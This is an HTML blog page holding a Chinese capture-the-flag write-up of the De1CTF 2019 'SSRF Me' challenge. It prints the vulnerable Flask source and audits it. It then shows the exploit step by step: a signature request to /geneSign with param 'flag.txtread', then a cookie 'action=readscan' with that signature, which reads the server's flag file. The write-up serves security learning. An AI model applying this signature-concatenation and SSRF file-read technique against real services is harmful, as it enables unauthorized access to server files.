@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[De1CTF 2019]SSRF Me1 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="首先看到有个提示，点开看到flag is in .&#x2F;flag.txt。再打开靶机，看到#! &#x2F;usr&#x2F;bin&#x2F;env python #encoding&#x3D;utf-8 from flask import Flask from flask import request import socket import hashlib import urllib">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[De1CTF 2019]SSRF Me1">
+<meta property="og:url" content="http://example.com/2025/02/16/De1CTF-2019-SSRF-Me1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="首先看到有个提示，点开看到flag is in .&#x2F;flag.txt。再打开靶机，看到#! &#x2F;usr&#x2F;bin&#x2F;env python #encoding&#x3D;utf-8 from flask import Flask from flask import request import socket import hashlib import urllib">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-02-16T11:35:21.000Z">
+<meta property="article:modified_time" content="2025-02-16T12:10:45.307Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-De1CTF-2019-SSRF-Me1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/16/De1CTF-2019-SSRF-Me1/" class="article-date">
+  <time class="dt-published" datetime="2025-02-16T11:35:21.000Z" itemprop="datePublished">2025-02-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      [De1CTF 2019]SSRF Me1
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首先看到有个提示，点开看到flag is in .&#x2F;flag.txt。再打开靶机，看到<br>#! &#x2F;usr&#x2F;bin&#x2F;env python #encoding&#x3D;utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding(‘latin1’) app &#x3D; Flask(<strong>name</strong>) secert_key &#x3D; os.urandom(16) class Task: def <strong>init</strong>(self, action, param, sign, ip): self.action &#x3D; action self.param &#x3D; param self.sign &#x3D; sign self.sandbox &#x3D; md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result &#x3D; {} result[‘code’] &#x3D; 500 if (self.checkSign()): if “scan” in self.action: tmpfile &#x3D; open(“.&#x2F;%s&#x2F;result.txt” % self.sandbox, ‘w’) resp &#x3D; scan(self.param) if (resp &#x3D;&#x3D; “Connection Timeout”): result[‘data’] &#x3D; resp else: print resp tmpfile.write(resp) tmpfile.close() result[‘code’] &#x3D; 200 if “read” in self.action: f &#x3D; open(“.&#x2F;%s&#x2F;result.txt” % self.sandbox, ‘r’) result[‘code’] &#x3D; 200 result[‘data’] &#x3D; f.read() if result[‘code’] &#x3D;&#x3D; 500: result[‘data’] &#x3D; “Action Error” else: result[‘code’] &#x3D; 500 result[‘msg’] &#x3D; “Sign Error” return result def checkSign(self): if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): return True else: return False #generate Sign For Action Scan. @app.route(“&#x2F;geneSign”, methods&#x3D;[‘GET’, ‘POST’]) def geneSign(): param &#x3D; urllib.unquote(request.args.get(“param”, “”)) action &#x3D; “scan” return getSign(action, param) @app.route(‘&#x2F;De1ta’,methods&#x3D;[‘GET’,’POST’]) def challenge(): action &#x3D; urllib.unquote(request.cookies.get(“action”)) param &#x3D; urllib.unquote(request.args.get(“param”, “”)) sign &#x3D; urllib.unquote(request.cookies.get(“sign”)) ip &#x3D; request.remote_addr if(waf(param)): return “No Hacker!!!!” task &#x3D; Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route(‘&#x2F;‘) def index(): return open(“code.txt”,”r”).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return “Connection Timeout” def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check&#x3D;param.strip().lower() if check.startswith(“gopher”) or check.startswith(“file”): return True else: return False if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘: app.debug &#x3D; False app.run(host&#x3D;’0.0.0.0’,port&#x3D;80)<br>对它进行代码审计。<br>if “scan” in self.action:<br>                tmpfile &#x3D; open(“.&#x2F;%s&#x2F;result.txt” % self.sandbox, ‘w’)<br>                resp &#x3D; scan(self.param)<br>                if (resp &#x3D;&#x3D; “Connection Timeout”):<br>                    result[‘data’] &#x3D; resp<br>                else:<br>                    print(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[‘code’] &#x3D; 200<br>            if “read” in self.action:<br>                f &#x3D; open(“.&#x2F;%s&#x2F;result.txt” % self.sandbox, ‘r’)<br>                result[‘code’] &#x3D; 200<br>                result[‘data’] &#x3D; f.read()<br>                if result[‘code’] &#x3D;&#x3D; 500:<br>                    result[‘data’] &#x3D; “Action Error”<br>print(resp)并不会真正的回显，而是回显到那个运行这个python代码的主机的命令行里，因此我们要想办法得到回显，就必须read文件。<br>而这里的判断用的是in，而不是&#x3D;&#x3D;。<br>得到签名sign   <a target="_blank" rel="noopener" href="http://106c09ac-2264-44a2-b580-c8f3b38a5923.node5.buuoj.cn:81/geneSign?param=flag.txtread">http://106c09ac-2264-44a2-b580-c8f3b38a5923.node5.buuoj.cn:81/geneSign?param=flag.txtread</a><br>便得到bdba6f540073af64956f11ceefc63ca3<br>添加Cookie发送请求得到flag<br>Cookie: action&#x3D;readscan;sign&#x3D;bdba6f540073af64956f11ceefc63ca3<br>flag{f6d09c77-a645-46a6-b0e8-444a139511cc}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/16/De1CTF-2019-SSRF-Me1/" data-id="cm77l51i00000x4x15cxncw1v" data-title="[De1CTF 2019]SSRF Me1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">[WMCTF2020]Make PHP Great Again</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/02/16/De1CTF-2019-SSRF-Me1/">[De1CTF 2019]SSRF Me1</a>
+          </li>
+        
+          <li>
+            <a href="/2025/02/09/WMCTF2020-Make-PHP-Great-Again/">[WMCTF2020]Make PHP Great Again</a>
+          </li>
+        
+          <li>
+            <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/">[红明谷CTF 2021]write_shell</a>
+          </li>
+        
+          <li>
+            <a href="/2025/02/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a>
+          </li>
+        
+          <li>
+            <a href="/2025/02/02/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/">[CISCN 2019 初赛]Love Math</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
